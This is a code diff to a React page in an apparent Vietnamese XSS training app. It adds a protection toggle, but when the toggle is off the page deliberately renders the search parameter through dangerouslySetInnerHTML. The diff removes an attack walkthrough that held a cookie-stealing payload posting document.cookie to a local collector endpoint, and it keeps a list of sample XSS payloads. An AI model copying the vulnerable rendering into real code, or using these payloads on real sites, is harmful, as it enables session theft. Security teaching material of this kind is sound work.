@@ -1,7 +1,8 @@
 import React, { useState } from 'react';
-import { Card, Typography, Input, Alert, Divider } from 'antd';
+import { Card, Typography, Input, Alert, Divider, Switch } from 'antd';
 import MainLayout from '../components/Layout/MainLayout';
 import { useSearchParams } from 'react-router-dom';
+import { sanitizeHTML, validateInput } from '../utils/sanitize';
 
 const { Title, Paragraph, Text } = Typography;
 const { Search } = Input;
@@ -9,13 +10,16 @@ const { Search } = Input;
 const ReflectedXSSPage = () => {
   const [searchParams, setSearchParams] = useSearchParams();
   const [userInput, setUserInput] = useState('');
+  const [isProtected, setIsProtected] = useState(true);
 
-  // Cố tình tạo lỗ hổng bằng cách render trực tiếp HTML từ query parameter
+  // Xử lý input với biện pháp bảo vệ
   const searchQuery = searchParams.get('q') || '';
+  const safeSearchQuery = isProtected ? sanitizeHTML(searchQuery) : searchQuery;
 
   const handleSearch = (value) => {
-    setUserInput(value);
-    setSearchParams({ q: value });
+    const safeValue = isProtected ? validateInput(value) : value;
+    setUserInput(safeValue);
+    setSearchParams({ q: safeValue });
   };
 
   return (
@@ -35,13 +39,30 @@ const ReflectedXSSPage = () => {
         </Card>
 
         <Card className="mb-4">
-          <Title level={4}>2. Demo Reflected XSS</Title>
+          <div className="flex justify-between items-center mb-4">
+            <Title level={4}>Demo Reflected XSS</Title>
+            <div className="flex items-center gap-2">
+              <Text>Bật/Tắt bảo vệ XSS:</Text>
+              <Switch
+                checked={isProtected}
+                onChange={setIsProtected}
+                checkedChildren="Bật"
+                unCheckedChildren="Tắt"
+              />
+            </div>
+          </div>
+
           <div className="mb-4">
             <Paragraph>
-              Trang này chứa lỗ hổng Reflected XSS trong việc xử lý query parameter. Khi bạn nhập
-              payload XSS vào ô tìm kiếm, nó sẽ được phản ánh trực tiếp vào trang thông qua{' '}
-              <Text code>dangerouslySetInnerHTML</Text>.
+              {isProtected ? (
+                <Text type="success">
+                  Chế độ bảo vệ đang bật. Các payload XSS sẽ bị vô hiệu hóa.
+                </Text>
+              ) : (
+                <Text type="danger">Chế độ bảo vệ đang tắt. Các payload XSS có thể hoạt động.</Text>
+              )}
             </Paragraph>
+
             <div className="mb-4">
               <Search
                 placeholder="Nhập nội dung tìm kiếm..."
@@ -54,48 +75,37 @@ const ReflectedXSSPage = () => {
             {searchQuery && (
               <div>
                 <Title level={4}>Kết quả tìm kiếm cho:</Title>
-                {/* Cố tình tạo lỗ hổng XSS bằng cách sử dụng dangerouslySetInnerHTML */}
-                <div dangerouslySetInnerHTML={{ __html: searchQuery }} />
+                {isProtected ? (
+                  <>
+                    <div>{safeSearchQuery}</div>
+
+                    <Divider />
+
+                    <Title level={4}>Các biện pháp phòng chống XSS đang được áp dụng:</Title>
+                    <ul>
+                      <li>Sanitize HTML input để loại bỏ các thẻ và thuộc tính nguy hiểm</li>
+                      <li>Encode các ký tự đặc biệt trong HTML</li>
+                      <li>Validate input trước khi xử lý</li>
+                      <li>Sử dụng textContent thay vì innerHTML khi bảo vệ được bật</li>
+                    </ul>
+                  </>
+                ) : (
+                  <>
+                    <div dangerouslySetInnerHTML={{ __html: searchQuery }} />
+                    <Paragraph>
+                      Trang này chứa lỗ hổng Reflected XSS trong việc xử lý query parameter. Khi bạn
+                      nhập payload XSS vào ô tìm kiếm, nó sẽ được phản ánh trực tiếp vào trang thông
+                      qua <Text code>dangerouslySetInnerHTML</Text>.
+                    </Paragraph>
+                  </>
+                )}
               </div>
             )}
           </div>
-
-          <Divider />
-
-          <Title level={4}>3. Cách thực hiện tấn công</Title>
-          <Paragraph>
-            <Text strong>Cách 1: Sử dụng form tìm kiếm</Text>
-            <br />
-            Nhập payload XSS vào ô tìm kiếm, ví dụ:
-            <br />
-            <Text code>{'<script>alert("XSS")</script>'}</Text>
-          </Paragraph>
-
-          <Paragraph>
-            <Text strong>Cách 2: Truy cập trực tiếp URL</Text>
-            <br />
-            Truy cập URL với payload XSS trong query parameter, ví dụ:
-            <br />
-            <Text code>
-              {window.location.origin + '/reflected-xss?q=<img src="x" onerror="alert(\'XSS\')">'}
-            </Text>
-          </Paragraph>
-
-          <Paragraph>
-            <Text strong>Cách 3: Đánh cắp cookie</Text>
-            <br />
-            Sử dụng payload sau để gửi cookie đến server của kẻ tấn công:
-            <br />
-            <Text code>
-              {encodeURIComponent(
-                "<img src=\"x\" onerror=\"fetch('http://localhost:5002/steal-cookies', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cookies: document.cookie, userAgent: navigator.userAgent})})\">"
-              )}
-            </Text>
-          </Paragraph>
         </Card>
 
         <Card className="mb-4">
-          <Title level={4}>4. Các payload XSS mẫu</Title>
+          <Title level={4}>Các payload XSS mẫu (chỉ hoạt động khi bảo vệ tắt):</Title>
           <ul>
             <li>
               <Text code>{'<img src="x" onerror="alert(\'XSS\')">'}</Text> - Sử dụng onerror
@@ -111,27 +121,6 @@ const ReflectedXSSPage = () => {
               javascript: protocol
             </li>
           </ul>
-        </Card>
-
-        <Card>
-          <Title level={4}>5. Cách phòng chống</Title>
-          <Paragraph>
-            <ul>
-              <li>
-                Không sử dụng <Text code>dangerouslySetInnerHTML</Text> với dữ liệu không đáng tin
-                cậy
-              </li>
-              <li>
-                Sử dụng <Text code>textContent</Text> hoặc <Text code>innerText</Text> thay thế
-              </li>
-              <li>Sanitize dữ liệu trước khi render</li>
-              <li>Sử dụng Content Security Policy (CSP)</li>
-              <li>Validate và encode dữ liệu đầu vào</li>
-              <li>Sử dụng thư viện sanitize như DOMPurify</li>
-              <li>Encode các ký tự đặc biệt trong HTML</li>
-              <li>Thiết lập header X-XSS-Protection</li>
-            </ul>
-          </Paragraph>
         </Card>
       </div>
     </MainLayout>
